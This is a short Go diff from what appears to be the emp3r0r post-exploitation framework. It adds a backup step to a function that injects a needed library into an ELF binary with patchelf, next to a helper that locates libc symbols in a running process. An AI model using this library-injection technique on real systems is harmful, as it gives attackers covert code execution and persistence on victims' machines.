@@ -12,6 +12,8 @@ import (
 	"os/exec"
 	"strconv"
 	"strings"
+
+	"github.com/jm33-m0/emp3r0r/core/lib/util"
 )
 
 // GetSymFromLibc: Get pointer to a libc function
@@ -73,6 +75,10 @@ func GetLibc(pid int) (path string, addr, offset int64) {
 
 // AddNeededLib: Add a needed library to an ELF file, lib_file needs to be full path
 func AddNeededLib(elf_file, lib_file string) (err error) {
+	// backup
+	bak := fmt.Sprintf("%s/%s.bak", RuntimeConfig.AgentRoot, elf_file)
+	util.Copy(elf_file, bak)
+
 	// patchelf cmd
 	cmd := fmt.Sprintf("%s/patchelf --add-needed %s %s",
 		RuntimeConfig.UtilsPath, lib_file, elf_file)
